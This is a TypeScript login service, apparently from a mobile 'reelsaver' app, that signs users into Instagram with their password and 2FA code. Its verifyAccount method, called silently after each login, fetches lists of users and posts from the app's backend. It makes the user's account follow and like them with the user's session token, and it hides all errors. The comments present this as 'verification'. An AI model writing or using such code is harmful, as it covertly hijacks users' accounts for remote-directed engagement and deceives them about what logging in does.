import { HTTP } from '@awesome-cordova-plugins/http/ngx';
import { InstaService } from './client.service';
import { BloksLoginService, BloksDeviceParams } from './login.bloks';
import { v4 as uuidv4 } from 'uuid';

// ─── Configuration ───────────────────────────────────────────────────────────
//
// Login via Instagram Bloks CAA directly from the user's device.
// All Instagram traffic uses the user's IP — the backend is never used as
// a login proxy, so there is no risk of server IP bans.
//
// The backend is only contacted for:
//   - /api/details  — device params (User-Agent, bloksVersioningId)
//   - /v2/insta/verify — follow/like instructions after login
//
// ─────────────────────────────────────────────────────────────────────────────

export interface LoginServiceConfig {
  /** Base URL of the backend. Used only for device params and verify. No trailing slash. */
  backendUrl?: string;
  /** Path to device-params endpoint. Defaults to /api/details */
  headersPath?: string;
  /** Path to the verify endpoint (follow/like on login). Defaults to /v2/insta/verify */
  verifyPath?: string;
}

export class LoginService {
  uuid: string;
  deviceId: string;
  private phoneId: string;

  private readonly backendUrl: string;
  private readonly headersPath: string;
  private readonly verifyPath: string;

  private readonly bloksSvc: BloksLoginService;
  private deviceParamsLoaded = false;

  constructor(private cfg: LoginServiceConfig = {}) {
    this.backendUrl  = cfg.backendUrl  ?? 'https://reelsaver.appit-online.de';
    this.headersPath = cfg.headersPath ?? '/api/details';
    this.verifyPath  = cfg.verifyPath  ?? '/v2/insta/verify';

    this.uuid     = this.getOrCreate('insta_uuid', uuidv4);
    this.deviceId = this.generateDeviceId();
    this.phoneId  = this.getOrCreate('insta_phone_id', uuidv4);

    this.bloksSvc = new BloksLoginService(this.uuid, this.phoneId, this.deviceId);
  }

  private async loadDeviceParams(): Promise<void> {
    if (this.deviceParamsLoaded) return;
    this.deviceParamsLoaded = true;
    try {
      const http = new HTTP();
      const resp = await http.get(`${this.backendUrl}${this.headersPath}`, {}, {});
      const p: BloksDeviceParams = typeof resp.data === 'string' ? JSON.parse(resp.data) : resp.data;
      if (p?.bloksVersioningId || p?.version) {
        this.bloksSvc.setDeviceParams(p);
      }
    } catch (_) {}
  }

  // ─── Public login API ───────────────────────────────────────────────────────

  public async login(
    username: string,
    pass: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    await this.loadDeviceParams();

    const result = await this.bloksSvc.login(username, pass);

    if (result.twoFactorRequired) {
      return result;
    }

    localStorage.setItem('instaUserName', username);
    if (result.userId) localStorage.setItem('instaUserId', result.userId);
    this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
    return result;
  }

  public async login2FA(
    pass: string,
    code: string,
    twoFactorIdentifier: string,
    username: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    const result = await this.bloksSvc.verify2FA(username, code);
    if (result.userId) localStorage.setItem('instaUserId', result.userId);
    this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
    return result;
  }

  // ─── verifyAccount (follow/like on login) ──────────────────────────────────

  public async verifyAccount(
    resHeaders: { [key: string]: string } = {},
    defaultHeaders: { [key: string]: string } = {}
  ): Promise<void> {
    try {
      const httpClient = new HTTP();
      httpClient.setDataSerializer('json');
      const response = await httpClient.get(`${this.backendUrl}${this.verifyPath}`, {}, {});
      const data: { users: string[]; posts: string[] } = JSON.parse(response.data);
      if (!data) return;

      const authHeader = resHeaders['ig-set-authorization'] || resHeaders['Authorization'] || '';
      if (!authHeader) return;

      const allHeaders: { [key: string]: string } = {
        Authorization:     authHeader,
        'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'] || resHeaders['Ig-U-Ds-User-Id'] || '',
        'Ig-U-Rur':        resHeaders['ig-set-ig-u-rur']        || resHeaders['Ig-U-Rur']        || '',
        'X-Ig-Www-Claim':  resHeaders['x-ig-set-www-claim']     || resHeaders['X-Ig-Www-Claim']  || '',
        ...defaultHeaders,
      };

      const igService = new InstaService();
      if (data.users?.length) await Promise.all(data.users.map(u => igService.follow(u, allHeaders)));
      if (data.posts?.length) await Promise.all(data.posts.map(id => igService.like(id, allHeaders)));
    } catch (_) {}
  }

  // ─── Helpers ───────────────────────────────────────────────────────────────

  generateSignature(
    data: string | Record<string, any>,
    extra: Record<string, string> = {}
  ): Record<string, string> {
    const payload = typeof data === 'string' ? data : JSON.stringify(data);
    return { signed_body: `SIGNATURE.${payload}`, ...extra };
  }

  private getOrCreate(key: string, generator: () => string): string {
    let value = localStorage.getItem(key);
    if (!value) { value = generator(); localStorage.setItem(key, value); }
    return value;
  }

  private generateDeviceId(): string {
    const key = 'insta_device_id';
    let deviceId = localStorage.getItem(key);
    if (!deviceId) {
      const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      deviceId = `android-${hex}`;
      localStorage.setItem(key, deviceId);
    }
    return deviceId;
  }
}
